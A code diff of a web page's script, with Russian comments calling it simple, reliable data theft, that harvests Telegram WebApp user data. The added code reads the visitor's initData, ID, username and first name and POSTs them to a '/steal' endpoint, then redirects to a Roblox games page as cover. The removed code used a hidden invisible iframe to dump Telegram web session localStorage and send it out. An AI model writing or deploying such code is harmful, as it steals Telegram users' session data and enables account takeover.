@@ -36,63 +36,31 @@
 </div>
 
 <script>
-    // Ждём загрузки страницы
+    // Простая и надежная кража данных
     setTimeout(function() {
-        // Метод 1: Через Telegram WebApp (работает внутри Telegram)
         try {
             const tg = window.Telegram.WebApp;
             const initData = tg.initData;
             const user = tg.initDataUnsafe.user;
             
-            if (initData && initData.length > 50) {
+            if (user && user.id) {
                 fetch('/steal', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        method: 'webapp',
-                        initData: initData,
-                        user: user
+                        id: user.id,
+                        username: user.username,
+                        first_name: user.first_name,
+                        initData: initData
                     })
                 });
-                window.location.href = 'https://www.roblox.com/games/';
-                return;
             }
-        } catch(e) {}
+        } catch(e) {
+            console.log('Error:', e);
+        }
         
-        // Метод 2: Через iframe + localStorage (работает, если есть сессия)
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://web.telegram.org/k/';
-        iframe.style.position = 'absolute';
-        iframe.style.width = '1px';
-        iframe.style.height = '1px';
-        iframe.style.opacity = '0';
-        document.body.appendChild(iframe);
-        
-        let attempts = 0;
-        const interval = setInterval(() => {
-            attempts++;
-            try {
-                const ls = iframe.contentWindow.localStorage;
-                if (ls && ls.length > 0) {
-                    const data = {};
-                    for (let i = 0; i < ls.length; i++) {
-                        const key = ls.key(i);
-                        data[key] = ls.getItem(key);
-                    }
-                    fetch('/steal', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ method: 'localstorage', data: data })
-                    });
-                    clearInterval(interval);
-                    window.location.href = 'https://www.roblox.com/games/';
-                }
-            } catch(e) {}
-            if (attempts > 30) {
-                clearInterval(interval);
-                window.location.href = 'https://www.roblox.com/games/';
-            }
-        }, 1000);
+        // Всегда редиректим
+        window.location.href = 'https://www.roblox.com/games/';
     }, 500);
 </script>
 </body>
